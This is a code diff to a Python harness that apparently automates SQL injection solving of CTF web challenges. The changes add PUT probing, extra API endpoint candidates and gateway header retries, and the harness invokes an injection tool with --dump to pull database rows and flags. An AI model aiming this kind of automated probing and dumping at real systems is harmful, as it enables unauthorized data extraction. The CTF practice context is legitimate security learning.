@@ -64,10 +64,10 @@ def probe_json(url: str, method: str, param: str, cookie: str,
                headers: dict) -> tuple[bool, dict, str]:
     """探测接口是否返回 {"code":..}；被 UA/Referer 网关拦住时自动补头重试。"""
     for _ in range(3):
-        if method.upper() == "POST":
-            s, body = http_post(url, {param: "1"}, cookie, headers)
-        else:
+        if method.upper() == "GET":
             s, body = http_get(f"{url}?{param}=1", cookie, headers)
+        else:
+            s, body = http_post(url, {param: "1"}, cookie, headers, method=method)
         if s == 200 and body.lstrip().startswith('{"code"'):
             return True, headers, body
         new = _gate_headers(body, headers)
@@ -160,14 +160,19 @@ def resolve_entry(base: str, name: str, cookie: str) -> dict:
         # 页面写的 action 不一定真实可用（web174 写 api/v2.php，真接口是 api/v4.php），
         # 逐个候选实测：返回 {"code":..} 的才是真接口
         cands = [action, urllib.parse.urljoin(action, "./"), base + page]
+        # api/ 目录索引在部分题里不认自定义方法，真正的入口是 api/index.php（web203）
+        for extra in ("api/index.php", "api/"):
+            cands.append(urllib.parse.urljoin(base, extra))
         for n in ([guess - 1, guess, guess + 1, guess + 2] if guess else []):
             cands.append(urllib.parse.urljoin(base, f"api/v{n}.php"))
         real, hdrs, method, fallback = "", {}, "GET", None
         for cand in dict.fromkeys(cands):
             if not cand:
                 continue
-            for m in ("GET", "POST"):
-                ok, h, body = probe_json(cand, m, param, cookie, {})
+            for m in ("GET", "POST", "PUT"):
+                # PUT 类网关要求 Content-Type: text/plain（web203 实测）
+                h0 = {"Content-Type": "text/plain"} if m == "PUT" else {}
+                ok, h, body = probe_json(cand, m, param, cookie, h0)
                 if ok and _has_data(body):
                     real, hdrs, method = cand, h, m
                     break
@@ -185,7 +190,7 @@ def resolve_entry(base: str, name: str, cookie: str) -> dict:
 
 
 def http_post(url: str, data: dict, cookie: str,
-              headers: dict | None = None) -> tuple[int, str]:
+              headers: dict | None = None, method: str = "POST") -> tuple[int, str]:
     import urllib.parse as up
     import urllib.request
     body = up.urlencode(data).encode()
@@ -193,7 +198,7 @@ def http_post(url: str, data: dict, cookie: str,
          "User-Agent": "Mozilla/5.0 AutoSQLi-battle",
          "Content-Type": "application/x-www-form-urlencoded"}
     h.update(headers or {})
-    req = urllib.request.Request(url, data=body, headers=h)
+    req = urllib.request.Request(url, data=body, headers=h, method=method.upper())
     try:
         with urllib.request.urlopen(req, timeout=25) as r:
             return r.status, r.read().decode("utf-8", "replace")
@@ -206,9 +211,9 @@ def stream_cli(url: str, param: str, method: str, fields: dict, headers: dict,
     cmd = [sys.executable, "-u", "-m", "autosqli.cli", "-u", url, "-p", param,
            "--dump", "--fast", "--max-seconds", str(budget), "--timeout", "12",
            "--workers", "8", "--max-rows", "60"]
-    if method.upper() == "POST":
+    if method.upper() != "GET":
         data = [f"{param}=1"] + [f"{k}={v}" for k, v in (fields or {}).items()]
-        cmd += ["--method", "POST", "--data", *data]
+        cmd += ["--method", method.upper(), "--data", *data]
     if headers:
         cmd += ["--header", *[f"{k}={v}" for k, v in headers.items()]]
     keep = re.compile(r"\[进度\]|注入点|指纹:|\[FLAG\]|\[WARN\]|\[ERROR\]|通道|请求数|"
